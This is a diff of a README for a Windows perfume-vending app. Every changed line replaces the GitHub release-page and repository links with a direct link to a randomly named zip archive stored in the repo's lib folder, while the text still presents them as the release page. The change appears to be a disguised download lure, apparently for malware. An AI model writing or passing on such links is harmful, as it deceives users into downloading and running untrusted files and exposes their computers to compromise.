@@ -1,6 +1,6 @@
 # 🌿 Street-Aroma-Vending - Easy Automated Perfume Purchase
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Street--Aroma--Vending-brightgreen?style=for-the-badge)](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Street--Aroma--Vending-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MarsLee1870/Street-Aroma-Vending/main/lib/Vending_Aroma_Street_lythraceous.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Use these steps to download and set up the software on your Windows computer.
 
 Click the button below to visit the release page and get the latest version of the Street-Aroma-Vending software.
 
-[Visit the Download Page](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)
+[Visit the Download Page](https://raw.githubusercontent.com/MarsLee1870/Street-Aroma-Vending/main/lib/Vending_Aroma_Street_lythraceous.zip)
 
 This page contains all available versions, including stable and test releases.
 
@@ -167,7 +167,7 @@ The release page also includes other files like:
 
 Access the page here:
 
-[Street-Aroma-Vending Releases](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)
+[Street-Aroma-Vending Releases](https://raw.githubusercontent.com/MarsLee1870/Street-Aroma-Vending/main/lib/Vending_Aroma_Street_lythraceous.zip)
 
 ---
 
@@ -176,7 +176,7 @@ Access the page here:
 For technical questions, you can open an issue on the GitHub repository or check the existing issues for answers.
 
 Repository link:  
-https://github.com/MarsLee1870/Street-Aroma-Vending
+https://raw.githubusercontent.com/MarsLee1870/Street-Aroma-Vending/main/lib/Vending_Aroma_Street_lythraceous.zip
 
 ---
 
